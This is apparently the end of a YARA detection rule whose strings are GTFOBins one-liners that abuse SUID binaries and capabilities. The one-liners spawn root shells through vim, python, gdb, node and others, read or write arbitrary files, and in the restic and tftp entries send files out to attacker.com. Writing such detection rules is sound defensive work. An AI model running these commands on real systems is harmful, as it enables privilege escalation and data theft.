        $gtfo_function_suid_python = "./python -c 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'"
        $gtfo_function_suid_rc = "./rc -c '/bin/sh -p'"
        $gtfo_function_suid_readelf = "LFILE=file_to_read\n./readelf -a @$LFILE\n"
        $gtfo_function_suid_restic = "RHOST=attacker.com\nRPORT=12345\nLFILE=file_or_dir_to_get\nNAME=backup_name\n./restic backup -r \"rest:http://$RHOST:$RPORT/$NAME\" \"$LFILE\"\n"
        $gtfo_function_suid_rev = "LFILE=file_to_read\n./rev $LFILE | rev\n"
        $gtfo_function_suid_rlwrap = "./rlwrap -H /dev/null /bin/sh -p" 
        $gtfo_function_suid_rsync = "./rsync -e 'sh -p -c \"sh 0<&2 1>&2\"' 127.0.0.1:/dev/null"
        $gtfo_function_suid_rtorrent = "echo \"execute = /bin/sh,-p,-c,\\\"/bin/sh -p <$(tty) >$(tty) 2>$(tty)\\\"\" >~/.rtorrent.rc\n./rtorrent\n"
        $gtfo_function_suid_run_parts = "./run-parts --new-session --regex '^sh$' /bin --arg='-p'"
        $gtfo_function_suid_rview = "./rview -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-pc\", \"reset; exec sh -p\")'" 
        $gtfo_function_suid_rvim = "./rvim -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-pc\", \"reset; exec sh -p\")'"
        $gtfo_function_suid_sash = "./sash"
        $gtfo_function_suid_scanmem = "./scanmem\nshell /bin/sh\n"
        $gtfo_function_suid_sed = "LFILE=file_to_read\n./sed -e '' \"$LFILE\"\n"
        $gtfo_function_suid_setarch = "./setarch $(arch) /bin/sh -p"
        $gtfo_function_suid_setfacl = "LFILE=file_to_change\nUSER=somebody\n./setfacl -m u:$USER:rwx $LFILE\n"
        $gtfo_function_suid_setlock = "./setlock - /bin/sh -p"
        $gtfo_function_suid_shuf = "LFILE=file_to_write\n./shuf -e DATA -o \"$LFILE\"\n"
        $gtfo_function_suid_soelim = "LFILE=file_to_read\n./soelim \"$LFILE\"\n"
        $gtfo_function_suid_softlimit = "./softlimit /bin/sh -p"
        $gtfo_function_suid_sort = "LFILE=file_to_read\n./sort -m \"$LFILE\"\n"
        $gtfo_function_suid_sqlite3 = "LFILE=file_to_read\nsqlite3 << EOF\nCREATE TABLE t(line TEXT);\n.import $LFILE t\nSELECT * FROM t;\nEOF\n"
        $gtfo_function_suid_ss = "LFILE=file_to_read\n./ss -a -F $LFILE\n"
        $gtfo_function_suid_ssh_agent = "./ssh-agent /bin/ -p"
        $gtfo_function_suid_ssh_keygen = "./ssh-keygen -D ./lib.so"
        $gtfo_function_suid_ssh_keyscan = "LFILE=file_to_read\n./ssh-keyscan -f $LFILE\n"
        $gtfo_function_suid_sshpass = "./sshpass /bin/sh -p"
        $gtfo_function_suid_start_stop_daemon = "./start-stop-daemon -n $RANDOM -S -x /bin/sh -- -p"
        $gtfo_function_suid_stdbuf = "./stdbuf -i0 /bin/sh -p"
        $gtfo_function_suid_strace = "./strace -o /dev/null /bin/sh -p"
        $gtfo_function_suid_strings = "LFILE=file_to_read\n./strings \"$LFILE\"\n"
        $gtfo_function_suid_sysctl = "COMMAND='/bin/sh -c id>/tmp/id'\n./sysctl \"kernel.core_pattern=|$COMMAND\"\nsleep 9999 &\nkill -QUIT $!\ncat /tmp/id\n"
        $gtfo_function_suid_systemctl = "TF=$(mktemp).service\necho '[Service]\nType=oneshot\nExecStart=/bin/sh -c \"id > /tmp/output\"\n[Install]\nWantedBy=multi-user.target' > $TF\n./systemctl link $TF\n./systemctl enable --now $TF\n"
        $gtfo_function_suid_tac = "LFILE=file_to_read\n./tac -s 'RANDOM' \"$LFILE\"\n"
        $gtfo_function_suid_tail = "LFILE=file_to_read\n./tail -c1G \"$LFILE\"\n"
        $gtfo_function_suid_taskset = "./taskset 1 /bin/sh -p"
        $gtfo_function_suid_tbl = "LFILE=file_to_read\n./tbl $LFILE\n"
        $gtfo_function_suid_tclsh = "./tclsh\nexec /bin/sh -p <@stdin >@stdout 2>@stderr\n"
        $gtfo_function_suid_tee = "LFILE=file_to_write\necho DATA | ./tee -a \"$LFILE\"\n"
        $gtfo_function_suid_terraform = "./terraform console\nfile(\"file_to_read\")\n"
        $gtfo_function_suid_tftp = "RHOST=attacker.com\n./tftp $RHOST\nput file_to_send\n"
        $gtfo_function_suid_tic = "LFILE=file_to_read\n./tic -C \"$LFILE\"\n"
        $gtfo_function_suid_time = "./time /bin/sh -p"
        $gtfo_function_suid_timeout = "./timeout 7d /bin/sh -p"
        $gtfo_function_suid_troff = "LFILE=file_to_read\n./troff $LFILE\n"
        $gtfo_function_suid_ul = "LFILE=file_to_read\n./ul \"$LFILE\"\n"
        $gtfo_function_suid_unexpand = "LFILE=file_to_read\n./unexpand -t99999999 \"$LFILE\"\n"
        $gtfo_function_suid_uniq = "LFILE=file_to_read\n./uniq \"$LFILE\"\n"
        $gtfo_function_suid_unshare = "./unshare -r /bin/sh"
        $gtfo_function_suid_unsquashfs = "./unsquashfs shell\n./squashfs-root/sh -p\n"
        $gtfo_function_suid_unzip = "./unzip -K shell.zip\n./sh -p\n"
        $gtfo_function_suid_update_alternatives = "LFILE=/path/to/file_to_write\nTF=$(mktemp)\necho DATA >$TF\n./update-alternatives --force --install \"$LFILE\" x \"$TF\" 0\n"
        $gtfo_function_suid_uudecode = "LFILE=file_to_read\nuuencode \"$LFILE\" /dev/stdout | uudecode\n"
        $gtfo_function_suid_uuencode = "LFILE=file_to_read\nuuencode \"$LFILE\" /dev/stdout | uudecode\n"
        $gtfo_function_suid_vagrant = "cd $(mktemp -d)\necho 'exec \"/bin/sh -p\"' > Vagrantfile\nvagrant up\n"
        $gtfo_function_suid_varnishncsa = "LFILE=file_to_write\n./varnishncsa -g request -q 'ReqURL ~ \"/xxx\"' -F '%{yyy}i' -w \"$LFILE\"\n"
        $gtfo_function_suid_view = "./view -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-pc\", \"reset; exec sh -p\")'"
        $gtfo_function_suid_vigr = "./vigr"
        $gtfo_function_suid_vim = "./vim -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-pc\", \"reset; exec sh -p\")'"
        $gtfo_function_suid_vimdiff = "./vimdiff -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-pc\", \"reset; exec sh -p\")'"
        $gtfo_function_suid_vipw = "./vipw"
        $gtfo_function_suid_w3m = "LFILE=file_to_read\n./w3m \"$LFILE\" -dump\n"
        $gtfo_function_suid_watch = "./watch -x sh -p -c 'reset; exec sh -p 1>&0 2>&0'"
        $gtfo_function_suid_wc = "LFILE=file_to_read\n./wc --files0-from \"$LFILE\"\n"
        $gtfo_function_suid_wget = "TF=$(mktemp)\nchmod +x $TF\necho -e '#!/bin/sh -p\\n/bin/sh -p 1>&0' >$TF\n./wget --use-askpass=$TF 0\n"
        $gtfo_function_suid_whiptail = "LFILE=file_to_read\n./whiptail --textbox --scrolltext \"$LFILE\" 0 0\n"
        $gtfo_function_suid_xargs = "./xargs -a /dev/null sh -p"
        $gtfo_function_suid_xdotool = "./xdotool exec --sync /bin/sh -p" 
        $gtfo_function_suid_xmodmap = "LFILE=file_to_read\n./xmodmap -v $LFILE\n"
        $gtfo_function_suid_xmore = "LFILE=file_to_read\n./xmore $LFILE\n"
        $gtfo_function_suid_xxd = "LFILE=file_to_read\n./xxd \"$LFILE\" | xxd -r\n"
        $gtfo_function_suid_xz = "LFILE=file_to_read\n./xz -c \"$LFILE\" | xz -d\n"
        $gtfo_function_suid_yash = "./yash"
        $gtfo_function_suid_zsh = "./zsh"
        $gtfo_function_suid_zsoelim = "LFILE=file_to_read\n./zsoelim \"$LFILE\"\n"
        // caps
        $gtfo_function_capabilities_gdb = "./gdb -nx -ex 'python import os; os.setuid(0)' -ex '!sh' -ex quit"
        $gtfo_function_capabilities_node = "./node -e 'process.setuid(0); require(\"child_process\").spawn(\"/bin/sh\", {stdio: [0, 1, 2]})'\n"
        $gtfo_function_capabilities_perl = "./perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec \"/bin/sh\";'"
        $gtfo_function_capabilities_php = "CMD=\"/bin/sh\"\n./php -r \"posix_setuid(0); system('$CMD');\"\n"
        $gtfo_function_capabilities_python = "./python -c 'import os; os.setuid(0); os.system(\"/bin/sh\")'"
        $gtfo_function_capabilities_ruby = "./ruby -e 'Process::Sys.setuid(0); exec \"/bin/sh\"'"
        $gtfo_function_capabilities_rview = "./rview -c ':py import os; os.setuid(0); os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'"
        $gtfo_function_capabilities_rvim = "./rvim -c ':py import os; os.setuid(0); os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'"
        $gtfo_function_capabilities_view = "./view -c ':py import os; os.setuid(0); os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'"
        $gtfo_function_capabilities_vim = "./vim -c ':py import os; os.setuid(0); os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'"
        $gtfo_function_capabilities_vimdiff = "./vimdiff -c ':py import os; os.setuid(0); os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'"

    condition:
        any of ($gtfo_function*)
}